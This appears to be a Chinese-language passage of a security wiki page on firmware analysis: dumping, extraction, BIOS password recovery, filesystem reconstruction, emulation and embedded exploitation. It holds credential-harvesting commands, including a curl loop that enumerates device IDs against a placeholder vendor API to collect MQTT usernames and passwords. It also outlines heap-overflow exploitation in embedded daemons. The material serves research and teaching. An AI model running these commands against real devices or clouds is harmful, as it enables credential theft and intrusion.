# 固件分析

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **简介**

### 相关资源

如需从暴露的硬件接口获取固件，请参阅 [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) 和 [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)。如需在访问控制台前重复执行启动时的 UART 捕获，请参阅 [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

固件是设备正常运行所必需的软件，负责管理并促进硬件组件与用户交互的软件之间的通信。固件存储在永久性存储器中，确保设备从通电时起就能访问关键指令，进而启动操作系统。检查并可能修改固件，是发现安全漏洞的关键步骤。<sup>[[2]](#references)[[3]](#references)</sup>

## **收集信息**

**收集信息**是了解设备构成及其所用技术的关键初始步骤。此过程包括收集以下数据：

- CPU 架构及其运行的操作系统
- Bootloader 的具体信息
- 硬件布局和数据手册
- 代码库指标和源代码位置
- 外部库及许可证类型
- 更新历史和监管认证
- 架构图和流程图
- 安全评估和已发现的漏洞

为此，**开源情报 (OSINT)** 工具非常有用；同时，也可以通过人工和自动化审查流程分析任何可用的开源软件组件。[Coverity Scan](https://scan.coverity.com) 和 [Semmle’s LGTM](https://lgtm.com/#explore) 等工具提供免费的静态分析，可用于查找潜在问题。

## **获取固件**

可以通过多种方式获取固件，每种方式的复杂程度各不相同：

- 从源头（开发者、制造商）**直接获取**
- 按照提供的说明**构建**
- 从官方支持网站**下载**
- 使用 **Google dork** 查询查找托管的固件文件
- 直接访问**云存储**，可使用 [S3Scanner](https://github.com/sa7mon/S3Scanner) 等工具
- 使用中间人技术拦截**更新**
- 通过 **UART**、**JTAG** 或 **PICit** 等连接从设备中**提取**
- 在设备通信中**嗅探**更新请求
- 查找并使用**硬编码的更新端点**
- 从 Bootloader 或网络中**转储**
- 如果其他方法都行不通，则使用适当的硬件工具**拆下并读取**存储芯片

### 仅有 UART 日志：通过闪存中的 U-Boot 环境变量强制启动 root shell

如果 UART RX 被忽略（只有日志），仍然可以通过离线**编辑 U-Boot 环境变量数据块**来强制启动 init shell：<sup>[[6]](#references)</sup>

1. 使用 SOIC-8 夹子和编程器（3.3V）转储 SPI flash：
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. 定位 U-Boot env 分区，编辑 `bootargs`，加入 `init=/bin/sh`，并为该 blob **重新计算 U-Boot env CRC32**。
3. 仅重新刷写 env 分区并重启；UART 上应该会出现 shell。

这在引导加载程序 shell 被禁用、但可通过外部 flash 访问写入 env 分区的嵌入式设备上很有用。

## 分析固件

现在你已经**拿到了固件**，需要提取相关信息，以了解如何处理它。可以使用的工具包括：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

如果使用这些工具没有发现太多内容，请用 `binwalk -E <bin>` 检查镜像的 **entropy（熵）**；如果熵较低，则它不太可能经过加密。如果熵较高，则它很可能经过加密（或以某种方式压缩）。

此外，你可以使用这些工具提取**固件中嵌入的文件**：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

也可以使用 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) 检查文件。

### 外部 flash 中的原始显示资源

外部 SPI 转储不一定是 MCU 的可执行固件。对于 Cortex-M 目标，请将每个候选代码区域的起始位置与设备内存映射进行比较：正常的向量表以一个看似合理的 SRAM 堆栈指针和位于可执行内存中的复位处理程序地址开头。仅凭偏移量 0 处没有向量表，并不能证明整个芯片都没有代码；还要检查其他偏移量和启动布局。如果 `binwalk` 没有找到容器，请检查原始字节，并将 [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) 中的 flash 读取地址与加载新屏幕的操作对应起来。<sup>[[14]](#references)</sup>

对于显示资源区域，请尝试不同的像素格式和尺寸，而不要直接假设它是 PNG/JPEG。文中引用的设备使用 **80×160 RGB565 little-endian** 帧：每个像素占两字节，因此一帧为 **25,600 bytes**（25 KiB），而不是 24 kilobits。解码后的 flash 读取地址确定了屏幕资源的偏移量；研究人员使用 `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` 转换准备好的图像，将原始转储中大小相同的资源替换掉，再使用 `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` 写入，并在显示屏上确认了新图像。这证明的是可写入的*外部显示资源*，而不是 MCU 内部固件的提取或重新刷写。执行任何写入前，请保留原始转储，并确认尺寸、字节序、偏移量和替换数据长度。<sup>[[14]](#references)</sup>

### 差分 flash 分析与可恢复的 XOR secret stores

如果某项固件设置没有记录其存储格式，首先进行几次匹配的 flash 读取，**只**更改一项设置，再次转储整颗芯片并比较偏移量。使用受控值重复实验，可以将该设置与计数器和写入元数据区分开；如果变化出现在新的偏移量而非原位置，则表明存储采用了仅追加或日志结构的方式。请保留已删除或标记为 tombstone 的条目，因为其中的有效载荷字节可能仍可恢复。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

定位该区域后，使用 `binwalk` 等工具提取固件模块，并在 Ghidra 中逆向分析写入器/验证器。通过代码确认字段边界、填充、密钥索引和密钥派生方式，而不要仅根据密文模式推断方案。<sup>[[12]](#references)</sup>

#### 从加密的零填充中恢复密钥

如 [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) 所述，已知明文可以揭示相同偏移处的密钥流字节。当固定大小字段的零填充覆盖重复 XOR 密钥的所有索引时，暴露风险尤其高：加密后的填充会直接揭示这些密钥字节，因为 `0x00 XOR key_byte = key_byte`。如果每个密钥索引都被覆盖，就可以从密文尾部重建密钥，并解密已填充的字节。<sup>[[12]](#references)</sup>

Dell 的易受攻击 DVAR BIOS 密码格式就是一个具体示例：32 字节字段中的字节 `0` 为明文，而字节 `1..31` 使用重复的 20 字节密钥。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

对于长度为 `L` 的密码，XOR 之前，位置 `L..31` 均为零。当 `L <= 12` 时，这些位置覆盖所有密钥索引，因此无需 brute force 即可恢复完整密钥和密码：<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 从历史记录中提取密钥

不要单独分析每条记录。DVAR 密钥大致通过 `modified_md5(device_seed || variable_GUID || password[0])` 派生：device seed 和 GUID 固定，唯一受密码影响的输入是明文的第一个字节。每台设备最多对应 256 个密钥，因此首字节相同的记录会共用一个密钥。按首字节对活动记录和已删除记录进行分组；一条较短的历史记录可能通过填充数据 leak 出完整密钥，并解密当前较长但填充数据不足的记录。因此，轮换密码时，如果旧密文只是被标记为删除而非彻底擦除，反而可能增加暴露风险。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 工具可定位 DVAR、验证候选记录、恢复密码，并显示原始存储字节/密钥字节。从代码仓库构建该工具，然后按如下方式扫描经过验证的闪存镜像：<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

对于自定义解析器，应通过记录结构、可打印字符约束、零填充检查、密钥熵，以及密钥回绕时的一致性来排除误报。如果重复转储显示每次写入只有少量位翻转，则列举观察到的掩码，并根据这些约束对修正结果排序；但应报告存在歧义的字符，而不要将启发式结果说成精确恢复。<sup>[[12]](#references)</sup>

密码验证器应存储加盐、经过多次迭代的单向哈希，而不是可逆密文；采用日志结构的存储应安全删除已被替换的机密材料。<sup>[[12]](#references)</sup>

### 获取文件系统

使用前面提到的工具命令（如 `binwalk -ev <bin>`），你应该已经能够**提取文件系统**。\
Binwalk 通常会将其提取到一个**以文件系统类型命名的文件夹中**，常见类型包括：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### 手动提取文件系统

有时，binwalk 的签名中**不包含文件系统的魔数字节**。在这种情况下，使用 binwalk **查找文件系统的偏移量，并从二进制文件中提取压缩文件系统**，然后按照以下步骤根据其类型**手动提取**文件系统。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

运行以下 **dd command** 提取 Squashfs 文件系统。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

或者也可以运行以下命令。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- 对于 squashfs（在上面的示例中使用）

`$ unsquashfs dir.squashfs`

之后，文件将位于 "`squashfs-root`" 目录中。

- CPIO 归档文件

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- 对于 jffs2 文件系统

`$ jefferson rootfsfile.jffs2`

- 对于使用 NAND 闪存的 ubifs 文件系统

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 重建拆分的嵌入式根文件系统

如果原始 eMMC/SSD 转储包含有效的文件系统头，但其元数据偏移量超出了标称分区范围，不要立即将其判定为损坏。嵌入式引导代码可以通过 Device Mapper 将多个物理范围组合成实际的根设备，因此仅从一个 GPT 分区提取数据，只会得到第一个片段。<sup>[[9]](#references)</sup>

#### 检查完整介质映像

首先确认采集已完成、映像大小稳定，并且没有写入程序仍在使用该映像。如果文件名中编码了起始/结束地址，请将该范围与实际字节数进行比较。以只读模式恢复 GPT，并仅附加所需范围；不要在工作站上对不可信的物理卷运行 `vgchange -ay`，因为这可能导致卷组冲突和意外写入。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

如果原始 init 逻辑或 LVM 堆栈必须读取完整镜像，请优先使用一次性 VM。标准启动分区中的历史启动日志尤其有用：bootloader 可能记录了专有容器的偏移量、组件长度、slot 选择、对齐规则和签名验证信息。使用这些值提取嵌入的命令行、kernel 和 initramfs，然后使用 `file`、magic bytes 和 `binwalk` 分别验证每个输出；读取到容器末尾可能会意外地把 initrd、ACPI object 或签名附加到 kernel 后面。<sup>[[9]](#references)</sup>

#### 恢复启动时的 block map

提取 kernel 的 initramfs，并逆向分析其中的 `/init` 和任何存储库。在 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) 中，查找 `/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64` 和分区路径的字符串引用；然后追踪用于选择活动 A/B slot 和构建 table 的代码。radare2 的实用起始命令包括 `r2 -A init`、`afl`、`pdf @ main` 和 `pdf @ fcn.xxxxx`。<sup>[[9]](#references)</sup>

linear target 会将虚拟设备的连续范围映射到一个或多个底层设备的范围。恢复出的双 segment table 通常具有如下形式（所有位置和长度均以 512-byte sector 为单位）：<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

精确复现机器码中的算术运算，包括整数宽度、移位和单位换算。例如，以下表达式会先将字节大小向下取整到 4-KiB 边界，再转换为 512-byte 扇区；若将其替换为 `p4_bytes // 512`，只要分区未按页对齐，选定的尾部位置就会偏移 `p4_bytes % 4096`。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

通过按表格顺序复制各个范围，并使用有界大小的数据块，而不是将完整的介质转储加载到内存中，来重建平面分析镜像。这样也能避免创建主机端的 mapper 设备。将 GPT 推导出的偏移量、反转后的扇区数以及最终输出长度分别作为断言检查。<sup>[[9]](#references)</sup>

#### 区分数据损坏与固定的重建错误

对于 SquashFS，在运行 `unsquashfs` 之前，先检查 `hsqs` magic，并解码超级块偏移量 40 处的小端序 64 位 `bytes_used` 字段。如果提取过程在多个互不相关的结构中失败，应在预期位置周围搜索较大的窗口，并要求候选结果具有可靠的结构特征：可解压的元数据块、多个连续有效的目录项、合理的 inode 字段、与 inode 数量相符的根 inode，或有效的完整性元数据结构。仅匹配到一个 magic 值并不足够。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

当相同的有符号偏移能让彼此独立的结构都变得有效时，例如目录元数据和 verity 记录，可能的原因是系统性的段起始位置错误，而不是缺少字节。回到反向计算，检查是否丢弃了余数、是否存在符号处理问题或溢出，以及是否进行了扇区/页对齐取整，然后再尝试恢复孤立数据或修补文件系统元数据。<sup>[[9]](#references)</sup>

最后，应区分不同的保护边界：TPM 密封的 LUKS 卷保护数据机密性，而经过签名的 dm-verity 映射保护根文件系统完整性。软件 TPM 无法恢复密封到原始物理 TPM 的密钥；通过仅供研究使用、且省略 verity 验证的 init 启动经过修改的 SquashFS，也不会伪造其签名或破坏 dm-verity。<sup>[[9]](#references)</sup>

## 分析固件

获取固件后，必须对其进行剖析，以了解其结构和潜在漏洞。此过程需要使用各种工具分析固件，并从固件映像中提取有价值的数据。

### 初步分析工具

下面提供了一组用于初步检查二进制文件（称为 `<bin>`）的命令。这些命令有助于识别文件类型、提取字符串、分析二进制数据，以及了解分区和文件系统的详细信息：

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

要评估镜像的加密状态，可以使用 `binwalk -E <bin>` 检查其**熵**。熵较低表示可能未加密，而熵较高则表示可能经过加密或压缩。

要提取**嵌入文件**，建议使用 **file-data-carving-recovery-tools** 文档等工具和资源，并使用 **binvis.io** 检查文件。

### 提取文件系统

使用 `binwalk -ev <bin>` 通常可以提取文件系统，提取结果通常位于以文件系统类型命名的目录中（例如 squashfs、ubifs）。不过，如果 **binwalk** 因缺少 magic bytes 而无法识别文件系统类型，就需要手动提取。具体来说，先用 `binwalk` 定位文件系统的偏移量，再使用 `dd` 命令提取文件系统：

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

之后，根据文件系统类型（例如 squashfs、cpio、jffs2、ubifs），使用不同命令手动提取内容。

### 文件系统分析

提取文件系统后，便开始搜索安全漏洞。重点关注不安全的网络守护进程、硬编码凭据、API 端点、更新服务器功能、未编译的代码、启动脚本，以及用于离线分析的编译二进制文件。

需要检查的**关键位置**和**项目**包括：

- **etc/shadow** 和 **etc/passwd** 中的用户凭据
- **etc/ssl** 中的 SSL 证书和密钥
- 可能存在漏洞的配置文件和脚本文件
- 用于进一步分析的嵌入式二进制文件
- 常见的 IoT 设备 Web 服务器和二进制文件

有几种工具可以帮助发现文件系统中的敏感信息和漏洞：

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 和 [**Firmwalker**](https://github.com/craigz28/firmwalker) 用于搜索敏感信息
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) 用于全面的固件分析
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 和 [**EMBA**](https://github.com/e-m-b-a/emba) 用于静态和动态分析

### 编译二进制文件的安全检查

必须仔细检查文件系统中的源代码和编译二进制文件，查找漏洞。**checksec.sh** 等工具可用于 Unix 二进制文件，**PESecurity** 可用于 Windows 二进制文件，以帮助识别可能遭到利用的未受保护二进制文件。

## 通过派生的 URL token 获取 cloud 配置和 MQTT 凭据

许多 IoT 集线器会从如下所示的 cloud 端点获取各设备的配置：<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

在固件分析过程中，你可能会发现 `<token>` 是使用硬编码密钥在本地从设备 ID 派生出来的，例如：

- token = MD5( deviceId || STATIC_KEY )，并以大写十六进制表示

这种设计使任何获知 deviceId 和 STATIC_KEY 的人都能重建该 URL 并获取 cloud 配置，其中通常会暴露明文 MQTT 凭据和主题前缀。

实用操作流程：

1) 从 UART 启动日志中提取 deviceId

- 连接 3.3V UART 适配器（TX/RX/GND）并捕获日志：

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 查找打印云配置 URL 模式和 broker 地址的行，例如：

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 从固件中恢复 STATIC_KEY 和 token 算法

- 将二进制文件加载到 Ghidra/radare2，并搜索配置路径（"/pf/"）或 MD5 的使用情况。
- 确认算法（例如，MD5(deviceId||STATIC_KEY)）。
- 在 Bash 中推导 token，并将摘要转换为大写：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 收集 cloud 配置和 MQTT 凭据

- 拼接 URL 并使用 curl 拉取 JSON；再用 jq 解析以提取机密：

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 滥用明文 MQTT 和薄弱的 topic ACL（如果存在）

- 使用恢复的凭据订阅维护主题，并查找敏感事件：

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 枚举可预测的设备 ID（大规模进行，需获得授权）

- 许多生态系统会嵌入供应商 OUI/产品/类型字节，后跟顺序递增的后缀。
- 你可以遍历候选 ID，以编程方式派生 token 并获取配置：

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

注记
- 始终在尝试大规模枚举之前获得明确授权。
- 尽可能优先使用仿真或静态分析来恢复 secrets，避免修改目标硬件。


仿真 firmware 的过程能够对设备的运行或单个程序进行 **动态分析**。这种方法可能会遇到硬件或架构依赖方面的挑战，但将 root filesystem 或特定二进制文件传输到架构和字节序匹配的设备（例如 Raspberry Pi）或预构建的虚拟机，可以便于进一步测试。

### 仿真单个二进制文件

检查单个程序时，确定程序的字节序和 CPU 架构至关重要。

#### MIPS 架构示例

要仿真 MIPS 架构的二进制文件，可以使用以下命令：

```bash
file ./squashfs-root/bin/busybox
```

以及安装必要的仿真工具：

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

对于 MIPS（大端序），使用 `qemu-mips`；对于小端序二进制文件，则使用 `qemu-mipsel`。

#### ARM 架构仿真

对于 ARM 二进制文件，过程类似，使用 `qemu-arm` 仿真器进行仿真。

### 完整系统仿真

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 等工具可以实现完整的固件仿真、自动化处理流程并辅助动态分析。

### 重建拆分并经过验证的根文件系统以进行仿真

如果 SquashFS 超级块可读，但 inode、目录或片段表的偏移量不可能成立，请不要立即修改 `unsquashfs`。应逆向分析早期启动二进制文件，并复现其创建的块设备图：嵌入式系统可能会提供一个名义上的根分区，但实际文件系统是通过 `dm-linear` 映射构建的，其中追加了从另一个分区借用的扇区。即使后续所有元数据块都发生了偏移，仅检查超级块也可能成功。<sup>[[11]](#references)</sup>

应原样保留固件中的运算方式。尤其要确认长度的单位是字节、512 字节扇区还是 4 KiB 页；按原始顺序复现移位和截断；并考虑 A/B 布局中依赖存储区的尾部区域。例如，`(partition_bytes >> 12) << 3` 会先截断到 4 KiB 边界，然后才转换为 512 字节扇区；若替换为 `partition_bytes // 512`，追加范围可能会偏移几 KB，并破坏所有后续 SquashFS 表。<sup>[[11]](#references)</sup>

一种实用的验证流程如下：<sup>[[11]](#references)</sup>

1. 从 verifier/init 二进制文件中还原每个 `dm-linear` 段的源设备、起始扇区和长度。
2. 拼接或映射这些范围，同时保持其对齐语义不变。
3. 如果提取仍然失败，只在预测边界附近的小范围内搜索，并要求连续找到多个有效元数据结构，而不是仅凭一个看似合理的超级块就接受结果。
4. 使用未经修改的 `unsquashfs` 处理重建的镜像；成功遍历所有目录和片段，比 `unsquashfs -stat` 更能证明结果正确。

#### 由分析人员控制的 dm-verity 替换

当分析人员控制 QEMU 内核、initramfs 和虚拟磁盘时，可以用一个小型静态链接的 init 替换厂商的验证 PID 1，以启动修改后的根文件系统。这是**实验环境中的启动链替换**，并不意味着攻破了 dm-verity、其 RSA 签名、Secure Boot 或 TPM 密封密钥。<sup>[[11]](#references)</sup>

替换用的 init 应模拟原始启动流程中的操作步骤：挂载 `devtmpfs`、调用 `setsid()`、将 `/dev/console` 连接到文件描述符 0–2、挂载 `/proc` 和 `/sys`、等待提供的块设备就绪、以只读方式挂载修改后的根文件系统、卸载旧根文件系统上的伪文件系统、将新挂载点移动到 `/`、执行 `chroot`，然后通过 `execve()` 启动固件原有的 `/sbin/init`。在执行 `MS_MOVE` **之前**卸载 `/dev`、`/proc` 和 `/sys`，可避免意外卸载属于新根文件系统的挂载点。<sup>[[11]](#references)</sup>

应将可变设备状态与修改后的不可变根文件系统分开存放。qcow2 overlay 可以保留原始磁盘的 LVM 状态，而第二个只读 virtio 磁盘则提供修改后的 SquashFS：<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 离线镜像状态调试

当启动缓慢、破坏性启动脚本或不可靠的控制台日志掩盖故障时，请检查 guest 外部的持久状态。切勿挂载正在被运行中 VM 使用的 overlay；使用 `qemu-nbd` 将其暴露出来，将 LVM 发现范围限制为目标 NBD 分区，并在断开连接前停用卷组。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

为了实现可重复的故障隔离，请将带时间戳的标记文件写入稳定且可写的卷，并在离线状态下验证；`/dev/kmsg`、FIFO 和临时控制台可能因速率限制或进程过早退出而导致假阴性。此外，在修改无关代码之前，应比较各层的确切接口：`uname -r` 与 `/lib/modules/`、磁盘上的 ext4 特性与内核配置，以及 Mesa `libGL` 的版本与 DRI 驱动 ABI 和根据 PCI 信息推导出的驱动名称。某个组件可能确实存在，甚至能成功执行 `dlopen()`，但由于使用它的程序要求不同的 ABI，仍然无法使用。<sup>[[11]](#references)</sup>

## 实际动态分析

在此阶段，可使用真实或模拟的设备环境进行分析。必须保持对操作系统和文件系统的 shell 访问权限。模拟环境可能无法完美模拟硬件交互，因此有时需要重启模拟环境。分析时应重新检查文件系统，利用暴露的网页和网络服务，并探查 bootloader 漏洞。固件完整性测试对于识别潜在的后门漏洞至关重要。

## 运行时分析技术

运行时分析是指在进程或二进制文件的运行环境中与其交互，并使用 gdb-multiarch、Frida 和 Ghidra 等工具设置断点，通过 fuzzing 等技术识别漏洞。

对于没有完整调试器的嵌入式目标设备，可将静态链接的 `gdbserver` **复制**到设备上并进行远程附加：<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 消息映射

在 IoT hub 上，RF stack 通常由 **radio MCU** 和 Linux userland process 分别处理。一个实用的工作流程是梳理以下路径：<sup>[[8]](#references)</sup>

1. 空中的 **RF frame**
2. radio MCU 上的 **controller-side parser**
3. 转发到 Linux 的 **serial/UART text or TLV protocol**（例如 `/dev/tty*`）
4. 主 daemon 中的 **application dispatcher**
5. **protocol-specific handler / state machine**

这种架构会产生两个逆向分析目标，而不是一个。如果 controller 将二进制 radio frame 转换为 `Group,Command,arg1,arg2,...` 这样的文本协议，应找出：

- **message group** 和 dispatch table
- 哪些消息可能来自 **network**，哪些可能来自 controller 本身
- 精确的 **manufacturer-specific discriminator field**（例如 Zigbee `manufacturer_code` 和自定义 `cluster_command`）
- 哪些 handler 只能在 **commissioning**、discovery 或 firmware/model 下载阶段访问

针对 Zigbee，应捕获配对流量，并检查目标设备是否仍依赖默认 **Link Key** `ZigBeeAlliance09`。如果是，嗅探 commissioning 流量可能会暴露 **Network Key**。Zigbee 3.0 install code 可以降低这种风险，因此要记录被测设备是否确实强制要求使用 install code。

### Manufacturer-specific protocol handler 和受 FSM 控制的可达性

Vendor-specific Zigbee/ZCL command 通常比标准化 cluster 更值得关注，因为它们会进入**自定义解析代码**和内部 **FSM**，而这些代码的验证往往经受的实战检验较少。<sup>[[8]](#references)</sup>

实用工作流程：

- 逆向分析 command dispatcher，直到找到 **vendor-only handler**。
- 找出 **FSM state**、**event**、**check**、**action** 和 **next-state** table。
- 找出会自动推进的 **transitional state**，以及最终会重置或释放攻击者可控状态的 retry/error 分支。
- 确认需要哪些合法的协议交互才能让 daemon 进入易受攻击的状态，不要假设存在漏洞的 handler 总是可达。

对于对时序敏感的协议，使用 Python framework 重放数据包可能太慢。更可靠的做法是使用真实硬件（例如 **nRF52840**）模拟合法设备，并运行 vendor 级别的 stack，以便暴露正确的 **endpoint**、**attribute** 和 commissioning 时序。

### Embedded daemon 中的分片下载漏洞类型

一种反复出现的 firmware 漏洞类型存在于**分片 blob/model/configuration 下载**中：<sup>[[8]](#references)</sup>

1. **第一个分片**（`offset == 0`）会存储 `ctx->total_size` 并分配 `malloc(total_size)`。
2. 后续分片只验证攻击者可控的**数据包局部**字段，例如 `packet_total_size >= offset + chunk_len`。
3. 执行复制时使用 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`，却不检查是否超出**最初分配的大小**。

攻击者可以：

- 发送一个有效的第一个分片，声明一个**较小**的 total size，以强制进行小尺寸 heap allocation。
- 后续发送一个带有**预期 offset**、但 `chunk_len` 更大的分片。
- 伪造 packet-local size，使其通过新一轮检查，同时仍溢出最初分配的 buffer。

当易受攻击的路径受 commissioning 逻辑控制时，exploit 必须包含足够的**设备模拟**，先让目标进入预期的 model-download 或 blob-download 状态，再发送格式错误的分片。

### 由协议触发的 `free()`

在 embedded daemon 中，触发 heap metadata exploitation 最简单的方法往往不是“等待清理”，而是**触发协议自身的错误处理**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续分片，让 FSM 进入 **retry** 或 **error** 状态。
- 超过 retry 阈值，使 daemon **重置 context** 并释放已损坏的 buffer。
- 利用这次可预测的 `free()` 触发 allocator-side primitive，避免进程因其他原因崩溃。

这对 embedded Linux 上的 **musl/uClibc/dlmalloc-like** allocator 尤其有用，因为破坏 chunk metadata 可以将 unlink/unbin 逻辑变成 write primitive。一种稳定的模式是破坏 **size field**，将 allocator traversal 导向溢出 buffer 内预先布置的**伪造 chunk**，而不是立即覆盖真实的 bin pointer 并导致进程崩溃。

## Binary Exploitation 和 Proof-of-Concept

为已发现的漏洞开发 PoC，需要深入了解目标架构，并使用较底层的语言编程。Embedded system 中的 binary runtime protection 并不常见，但如果存在，可能需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation 说明（embedded Linux）

